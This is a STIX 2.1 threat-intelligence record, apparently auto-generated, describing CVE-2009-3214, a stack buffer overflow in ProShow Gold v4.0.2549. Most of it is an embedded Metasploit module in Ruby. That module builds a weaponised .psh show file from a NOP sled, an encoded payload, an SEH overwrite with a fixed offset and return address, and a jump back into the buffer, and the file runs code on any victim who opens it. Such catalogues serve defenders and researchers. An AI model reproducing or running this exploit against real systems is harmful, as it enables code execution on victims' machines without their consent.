{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4bf7d30-eeb0-4329-a497-3964dc3cb1a2",
    "created": "2024-08-14T16:35:54.489547Z",
    "modified": "2024-08-14T16:35:54.48955Z",
    "name": "ProShow Gold v4.0.2549 (PSH File) Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in ProShow Gold v4.0.2549. An attacker must send the file to victim and the victim must open the file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/proshow_cellimage_bof.rb",
            "external_id": "proshow_cellimage_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3214"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ProShow Gold v4.0.2549 (PSH File) Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in ProShow Gold v4.0.2549.\n        An attacker must send the file to victim and the victim must open the file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-3214' ],\n          [ 'OSVDB', '57226' ],\n          [ 'EDB', '9483' ],\n          [ 'EDB', '9519' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # 0x01a614ea # p/p/r @ all.dnt\n          [ 'Windows Universal', { 'Offset' => 4036, 'Ret' => 0x101a4cf9 } ], # p/p/r if.dnt\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-08-20',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.psh']),\n      ])\n  end\n\n  def exploit\n\n    sploit = make_nops(target['Offset'] - 4 - payload.encoded.length)\n    sploit << payload.encoded\n    sploit << generate_seh_record(target.ret)\n\n    # note, just in case the arguments get modified, we'll jump back into our buffer...\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + target['Offset'].to_s).encode_string\n\n    # cause exception hitting the end of the stack\n    sploit << rand_text(1000) * 13\n\n    content = \"Photodex(R) ProShow(TM) Show File Version=0\\r\\n\"\n    content << \"cells=1\\r\\n\"\n    content << \"cell[0].nrOfImages=1\\r\\n\"\n    content << \"cell[0].images[0].image=\" << sploit << \"\\r\\n\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(content)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-08-20",
    "x_mitre_platforms": [
        "win'"
    ]
}